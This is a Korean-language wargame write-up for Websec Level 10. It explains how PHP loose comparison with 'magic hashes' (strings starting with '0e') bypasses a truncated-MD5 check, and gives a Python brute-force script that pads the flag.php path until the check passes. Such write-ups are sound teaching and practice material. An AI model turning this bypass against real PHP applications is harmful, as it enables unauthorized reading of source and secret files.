---
title : "Websec - Level 10 (풀이봄)"
categories : [Wargame, Websec]
tags: ["type juggling", "magic hash", 풀이 봄]
---

## Level 10
<hr style="border-top: 1px solid;"><br>

``` php
if (isset ($_REQUEST['f']) && isset ($_REQUEST['hash'])) {
    $file = $_REQUEST['f'];
    $request = $_REQUEST['hash']; // default: substr(md5($flag.'index.php'.$flag),0,8) -> b4382d64
    $hash = substr (md5 ($flag . $file . $flag), 0, 8);
    echo '<div class="row"><br><pre>';
    if ($request == $hash) {
        show_source ($file);
    } 
    else {
        echo 'Permission denied!';
    }
    echo '</pre></div>';
}
```

<br><br>
<hr style="border: 2px solid;">
<br><br>

## Solution
<hr style="border-top: 1px solid;"><br>

```flag.php``` 파일을 확인을 해야하므로 ```$file``` 값은 ```flag.php```가 되고, 입력한 해쉬 값과 ```$hash``` 변수 값을 비교하는 부분을 통과를 해야함. 

여기서 ```magic hash```란 것이 있다.

```md5``` 해쉬 암호화를 했을 때, ```0e1234``` 이런 식으로 암호화 되는 경우가 있는데 ```0e```로 시작하면 그 값은 ```0```과 같음. 
: ```'0e12345' == 0 --> true```

<br>

파일 이름에 따라 ```$hash``` 값이 바뀌게 되는데 ```flag.php``` 파일은 읽어야 되므로 ```'.'``` 과 ```'/'```을 붙여줘서 브루트 포스를 하면 됨. 

<br>

한 870번 조금 넘어설때 쯤 됨.

Linux에서는 파일을 실행할 때 ./파일명 이렇게 하는데 ```'/'```의 개수가 몇 개가 있든 실행이 됨.  

<br>

```python
import requests

url='http://websec.fr/level10/index.php'
string='flag.php';
headers={'Content-Type':'application/x-www-form-urlencoded'}
for i in range(1,1000) :
    data={'f':string,'hash':0}
    res=requests.post(url,data=data,headers=headers)
    if("Permission denied!" not in res.text):
        print(res.text)
        break
    print("fail.. "+str(i)+" trying")
    string='.'+'/'*i+'flag.php'
```

<br><br>
<hr style="border: 2px solid;">
<br><br>
